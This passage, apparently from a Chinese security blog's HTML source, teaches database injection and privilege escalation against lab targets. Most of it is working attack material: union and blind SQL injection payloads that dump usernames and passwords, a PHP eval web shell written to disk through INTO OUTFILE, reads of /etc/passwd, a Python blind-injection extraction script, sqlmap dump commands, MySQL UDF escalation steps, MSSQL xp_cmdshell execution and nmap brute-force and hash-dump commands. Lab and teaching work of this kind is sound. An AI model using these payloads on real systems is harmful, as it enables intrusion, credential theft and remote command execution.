class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,group_concat(username),group_concat(password)from users -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/3.png" alt></p>
+<p>写文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select null,null,&apos;&lt;?php @eval($_POST[&apos;Rj45&apos;]);?&gt;&apos; into outfile &apos;/tmp/Rj45.php&apos; -- -</span><br><span class="line"></span><br><span class="line">推荐进行十六进制编码</span><br><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select null,null,0x273C3F70687020406576616C28245F504F53545B27526A3435275D293B3F3E27 into outfile &apos;/tmp/Rj45.php&apos; -- -</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/4.png" alt></p>
+<p>读文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,load_file(&apos;&apos;/tmp/Rj45.php&apos;),load_file(&apos;/etc/passwd&apos;)-- -</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/5.png" alt></p>
+<p>布尔盲注：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/a.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">注入点</span><br><span class="line">同上</span><br><span class="line"></span><br><span class="line">数据库基本信息</span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(substr((database()),1,1))=ascii(&apos;a&apos;)%23</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=ascii(&apos;a&apos;) %23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据表</span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(substr((select table_name from information_schema.tables limit 0,1),1,1))=ascii(&apos;a&apos;) where table_schema=database %23</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">数据列</span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(substr((select column_name from information_schema.columns limit 0,1),1,1))=ascii(&apos;a&apos;) where table_schema=database %23</span><br><span class="line"></span><br><span class="line">数据</span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(substr((select username from users limit 0,1),1,1))=ascii(&apos;a&apos;) %23</span><br></pre></td></tr></table></figure>
+<p>sqlmap：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.3.6/Less-5/?id=1 -p id --technique B --v 3 --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/6.png" alt></p>
+<p>脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">import requests,string,re,time</span><br><span class="line"></span><br><span class="line">def getDatabase(url,r):</span><br><span class="line">	database = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for s in letters:</span><br><span class="line">			ur = url+&quot;ord(substr((database()),&quot;+str(i)+&quot;,1))=ascii(&apos;&quot;+s+&quot;&apos;)%23&quot;</span><br><span class="line">			print(ur)</span><br><span class="line">			res = r.get(ur)</span><br><span class="line">			try:</span><br><span class="line">				res = re.search(r&apos;You are in&apos;,res.text).group(0)</span><br><span class="line">				database +=s</span><br><span class="line">			except:</span><br><span class="line">				pass</span><br><span class="line">	print(&apos;当前数据库为：&apos;+database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getDatabases(url,r):</span><br><span class="line">	databases = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for j in range(0,5):</span><br><span class="line">			for s in letters:</span><br><span class="line">				ur = url+&quot;ord(substr((select schema_name from information_schema.schemata limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))=ascii(&apos;&quot;+s+&quot;&apos;)%23&quot;</span><br><span class="line">				print(ur)</span><br><span class="line">				res = r.get(ur)</span><br><span class="line">				try:</span><br><span class="line">					res = re.search(r&apos;You are in&apos;,res.text).group(0)</span><br><span class="line">					databases +=s</span><br><span class="line">					time.sleep(3)</span><br><span class="line">				except:</span><br><span class="line">					pass</span><br><span class="line">	print(&apos;所有数据库为：&apos;+databases)</span><br><span class="line"></span><br><span class="line">def getTables(url,r):</span><br><span class="line">	tables = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for j in range(0,5):</span><br><span class="line">			for s in letters:</span><br><span class="line">				ur = url+&quot;ord(substr((select table_name from information_schema.tables limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))=ascii(&apos;&quot;+s+&quot;&apos;) where table_schema=database %23&quot;</span><br><span class="line">				print(ur)</span><br><span class="line">				res = r.get(ur)</span><br><span class="line">				try:</span><br><span class="line">					res = re.search(r&apos;You are in&apos;,res.text).group(0)</span><br><span class="line">					tables +=s</span><br><span class="line">					time.sleep(3)</span><br><span class="line">				except:</span><br><span class="line">					pass</span><br><span class="line">	print(&apos;当前数据库的所有数据表为：&apos;+tables)</span><br><span class="line"></span><br><span class="line">def getColumns(url,r):</span><br><span class="line">	columns = &apos;&apos;</span><br><span class="line">	for i in range(1,10):</span><br><span class="line">		for j in range(0,5):</span><br><span class="line">			for s in letters:</span><br><span class="line">				ur = url+&quot;ord(substr((select column_name from information_schema.columns limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))=ascii(&apos;&quot;+s+&quot;&apos;) where table_schema=database %23&quot;</span><br><span class="line">				print(ur)</span><br><span class="line">				res = r.get(ur)</span><br><span class="line">				try:</span><br><span class="line">					res = re.search(r&apos;You are in&apos;,res.text).group(0)</span><br><span class="line">					tables +=s</span><br><span class="line">					time.sleep(3)</span><br><span class="line">				except:</span><br><span class="line">					pass</span><br><span class="line">	print(&apos;当前数据库的所有数据表的所有数据列为：&apos;+columns)</span><br><span class="line"></span><br><span class="line">def getData(url,r):</span><br><span class="line">	data = &apos;&apos;</span><br><span class="line">	for i in range(1,20):</span><br><span class="line">		for j in range(0,20):</span><br><span class="line">			for s in letters:</span><br><span class="line">				ur = url+&quot;ord(substr((select username from users limit &quot;+str(j)+&quot;,1),&quot;+str(i)+&quot;,1))=ascii(&apos;&quot;+s+&quot;&apos;)%23&quot;</span><br><span class="line">				print(ur)</span><br><span class="line">				res = r.get(ur)</span><br><span class="line">				try:</span><br><span class="line">					res = re.search(r&apos;You are in&apos;,res.text).group(0)</span><br><span class="line">					data +=s</span><br><span class="line">					time.sleep(3)</span><br><span class="line">				except:</span><br><span class="line">					pass</span><br><span class="line">	print(&apos;数据：&apos;+data)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	letters = string.ascii_letters</span><br><span class="line">	url = &quot;http://192.168.3.6/Less-5/?id=1&apos; and &quot;</span><br><span class="line">	r = requests.Session()</span><br><span class="line">	getDatabase(url,r)</span><br><span class="line">	getDatabases(url,r)</span><br><span class="line">	getTables(url,r)</span><br><span class="line">	getTables(url,r)</span><br><span class="line">	getData(url,r)</span><br></pre></td></tr></table></figure>
+
+<p>延时注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.3.6/Less-5/?id=1 -p id --technique T --time-sec 5 --v 3 --dump</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/6.png" alt></p>
+<h1 id="函数在注入过程中的利用"><a href="#函数在注入过程中的利用" class="headerlink" title="函数在注入过程中的利用"></a>函数在注入过程中的利用</h1><p>1、ascii(s)：返回字符串s的第一个字符的ascii码</p>
+<p>可以用于布尔盲注中，结合ord()函数会更加直观显示。时间盲注也行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ascii(database())=115 --+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/32.png" alt></p>
+<p>2、char_length(s)\character_length(s)：返回字符串s的字符数</p>
+<p>在盲注中可以用到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and char_length(database())=8 --+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/33.png" alt></p>
+<p>3、concat(s1,s2,…,sn):合并s1,s2,…sn字符为一个字符</p>
+<p>在注入，将多个字段的数据一列一次性返回，与concat_ws(0x7e,s1,s2,…,sn)一样。</p>
+<p>不过联合注入一般是用group_concat(s1,s2,…,sn)函数，其将一个字段的所有函数一次性返回。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-1/?id=0&apos; union select 0,group_concat(username),group_concat(password)from users --+</span><br></pre></td></tr></table></figure>
+
+<p>4、mid(s,n,len)\substr(s,n,len)\substring(s,n,len)：从s中的n位置开始截取长度为len的子字符串</p>
+<p>一般用于盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(mid((database()),1,1))=ascii(&apos;s&apos;)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/34.png" alt></p>
+<p>5、right(s,n)：返回字符串s的后n个字符</p>
+<p>一般用于盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(right((database()),1))=ascii(&apos;y&apos;)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/35.png" alt></p>
+<p>6、left(s,n):返回字符串s的前n个字符</p>
+<p>一般用于盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and ord(left((database()),1))=ascii(&apos;s&apos;)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/36.png" alt></p>
+<p>7、if(expr,v1,v2)：如果表达式 expr 成立，返回结果 v1；否则，返回结果 v2</p>
+<p>一般结合sleep(),用于时间盲注。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and if((ord(left((database()),1))=ascii(&apos;s&apos;)),sleep(5),0)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/37.png" alt></p>
+<p>8、strcmp(s1,s2)：比较s1和s2，如相同返回0，s1&gt;s2返回1，否则返回-1</p>
+<p>一般用于盲注,这里的payload比较微妙。</p>
+<p>当s1与s2相同时会返回0，这时候在if(expr,v1,v2)中会进入v2，从而构成判断逻辑。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and if(strcmp((select database()),&apos;security&apos;),sleep(5),1)--+</span><br><span class="line"></span><br><span class="line">http://192.168.3.6/Less-5/?id=1&apos; and if(strcmp((select database()),&apos;security1&apos;),sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/38.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/39.png" alt></p>
+<h1 id="mysql的udf"><a href="#mysql的udf" class="headerlink" title="mysql的udf"></a>mysql的udf</h1><p>介绍：</p>
+<p>mysql(user defined function)用户自定义函数，是mysql的一个拓展接口。</p>
+<p>用户可以通过自定义函数拓展mysql的功能。</p>
+<p>其添加的新函数都可以在sql语句中调用。</p>
+<p>原理：</p>
+<p>利用了数据库的root高权限，创建系统函数的udf动态函数库，从而就可以利用系统权限进行提权操作。</p>
+<p>提权：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、查询导出路径</span><br><span class="line">2、上传udf</span><br><span class="line">3、导出udf</span><br><span class="line">4、创建函数</span><br><span class="line">5、执行命令</span><br></pre></td></tr></table></figure>
+
+<p>详细：</p>
+<p>1、查询导出路径和条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;;</span><br><span class="line">select @@plugin_dir;</span><br><span class="line">select @@version_compile_os,@@version_compile_machine;</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/7.png" alt></p>
+<p>注意</p>
+<p>如该目录不存在，则需要创建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\ProgramFile\\MYSQL路径\\lib::$INDEX_ALLOCATION&apos;;</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\ProgramFile\\MYSQL路径\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br></pre></td></tr></table></figure>
+<p>2、上传udf</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/8.png" alt></p>
+<p>sqlmap中的udf需要解码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap/extra/cloak/cloak.py -d -i udf路径文件</span><br></pre></td></tr></table></figure>
+
+<p>将udf文件进行十六进制编码，然后创建一张临时表，插入udf数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table temp(data blob);</span><br><span class="line">insert into temp(data)values((convert($binaryCode_udf_data,char))));</span><br></pre></td></tr></table></figure>
+<p>注意</p>
+<p>对udf进行十六进制编码，可以首先在本地创建临时表，利用hex()函数进行编码导入，然后再直接导出</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table temp_test(data blob);</span><br><span class="line">insert into temp_test(data) values(hex(load_file(&apos;udf路径文件&apos;)));</span><br><span class="line">select data from temp_test into dumpfile &apos;udf路径文件&apos;;</span><br></pre></td></tr></table></figure>
+
+<p>3、导出udf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select data from temp into dumpfile &apos;路径\\plugin\udf.dll&apos;;</span><br><span class="line">drop table temp;</span><br></pre></td></tr></table></figure>
+<p>4、创建函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crate function sys_eval returns string soname &apos;udf.dll&apos;;</span><br></pre></td></tr></table></figure>
+<p>5、执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select sys_eval(command);</span><br><span class="line">drop function sys_eval;</span><br><span class="line">delete from mysql.func where name = &apos;sys_eval&apos;;</span><br></pre></td></tr></table></figure>
+
+<h1 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h1><p>以Raven2靶机的udf提权作为例子</p>
+<p><a href="https://www.vulnhub.com/entry/raven-2,269/" target="_blank" rel="noopener">靶机下载</a></p>
+<p>存活扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br></pre></td></tr></table></figure>
+<p>端口扫描：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/10.png" alt></p>
+<p>web服务踩点：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/9.png" alt></p>
+<p>目录扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.0.104/ /usr/share/dirb/wordlists/big.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/11.png" alt></p>
+<p>博客扫描：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.0.104/wordpress/ -e u</span><br></pre></td></tr></table></figure>
+<p>发现两个用户<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/15.png" alt></p>
+<p>目录踩点：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/12.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/13.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/14.png" alt></p>
+<p>phpmailer挖掘：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmailer</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/16.png" alt><br>修改exp:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">安装py库requests_toolbelt</span><br><span class="line">#coding:utf-8</span><br><span class="line">靶机ip和文件</span><br><span class="line">攻击机ip和端口</span><br></pre></td></tr></table></figure>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/17.png" alt></p>
+<p>触发反弹shell:</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/18.png" alt></p>
+<p>查找到数据库账户信息：</p>
+<p>flag2.txt<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/e.png" alt></p>
+<p>flag3.png<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/f.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/19.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/20.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/21.png" alt></p>
+<p>mysql之udf提权：</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/22.png" alt></p>
+<p>编译</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/23.png" alt></p>
+<p>上传</p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/24.png" alt></p>
+<p>登陆数据库<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/25.png" alt></p>
+<p>导入数据库<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/26.png" alt></p>
+<p>导出数据库<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/27.png" alt></p>
+<p>创建函数<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/28.png" alt></p>
+<p>使用函数<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/29.png" alt></p>
+<p>执行命令<br><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/30.png" alt></p>
+<p><img src="/mysql%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%A9%E7%94%A8/31.png" alt></p>
+<h1 id="mssql的xp-cmdshell与sp-oacreate"><a href="#mssql的xp-cmdshell与sp-oacreate" class="headerlink" title="mssql的xp_cmdshell与sp_oacreate"></a>mssql的xp_cmdshell与sp_oacreate</h1><p>介绍：</p>
+<p>xp_cmdshell与sp_oacreate是mssql的存储过程的扩展，类似udf于mysql。</p>
+<p>xp_cmdshell的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;reconfigure;</span><br><span class="line">exec sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;</span><br><span class="line"></span><br><span class="line">exec master.dbo.xp_cmdshell &apos;command&apos;;</span><br></pre></td></tr></table></figure>
+<p>sp_oacreate的利用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &apos;show advanced options&apos;,1;reconfigure;</span><br><span class="line">exec sp_configure &apos;ole automation procedures&apos;,1;reconfigure;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">declare @shell int</span><br><span class="line">exec sp_oacreate &apos;wscript.shell&apos;,@shell out</span><br><span class="line">exec sp_method @shell,&apos;run&apos;,null,&apos; c:\windows\system32\cmd.exe \c &quot;command&quot; &apos;;</span><br></pre></td></tr></table></figure>
+<p>nmap对mmsql的支持：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 爆破mssql用户名和密码：</span><br><span class="line">nmap -p 1433 --script=ms-sql-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.1.1</span><br><span class="line"></span><br><span class="line"># xp_cmdshell执行命令</span><br><span class="line">nmap -p 1433 --script=ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=&quot;net user&quot; 192.168.1.1</span><br><span class="line"></span><br><span class="line">#dump_hash</span><br><span class="line">nmap -p 1433 --script=ms-sql-dump-hashes.nse --script-args mssql,username=sa,mssql.password=sa 192.168.1.1</span><br></pre></td></tr></table></figure>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.runoob.com/mysql/mysql-functions.html" target="_blank" rel="noopener">https://www.runoob.com/mysql/mysql-functions.html</a></p>
+<p><a href="https://www.freebuf.com/articles/system/163144.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/163144.html</a></p>
+<p><a href="https://blog.csdn.net/qq_26090065/article/details/81515355" target="_blank" rel="noopener">https://blog.csdn.net/qq_26090065/article/details/81515355</a></p>
+<p><a href="https://blog.csdn.net/weixin_43689084/article/details/84963351" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43689084/article/details/84963351</a></p>
+<p><a href="https://www.cnblogs.com/R4v3n/articles/8722657.html" target="_blank" rel="noopener">https://www.cnblogs.com/R4v3n/articles/8722657.html</a></p>
+<p><a href="https://blog.csdn.net/qq_32434307/article/details/86591649" target="_blank" rel="noopener">https://blog.csdn.net/qq_32434307/article/details/86591649</a></p>
+<p><a href="https://www.freebuf.com/articles/web/55577.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/55577.html</a></p>
+<p><a href="https://www.jianshu.com/p/6f8f4906b4cf" target="_blank" rel="noopener">https://www.jianshu.com/p/6f8f4906b4cf</a></p>
+<p><a href="https://www.jianshu.com/p/e79d2a42338b" target="_blank" rel="noopener">https://www.jianshu.com/p/e79d2a42338b</a></p>
+<p><a href="https://www.cnblogs.com/bmjoker/p/10034001.html" target="_blank" rel="noopener">https://www.cnblogs.com/bmjoker/p/10034001.html</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/archives/">articles</a></li>
+         
+          <li><a href="/web/">web</a></li>
+         
+          <li><a href="/penetration/">penetration</a></li>
+         
+          <li><a href="/pwn/">pwn</a></li>
+         
+          <li><a href="/docker">docker</a></li>
+         
+          <li><a href="/resources/">resources</a></li>
+         
+          <li><a href="/firends/">firends</a></li>
+         
+          <li><a href="/about/">about</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
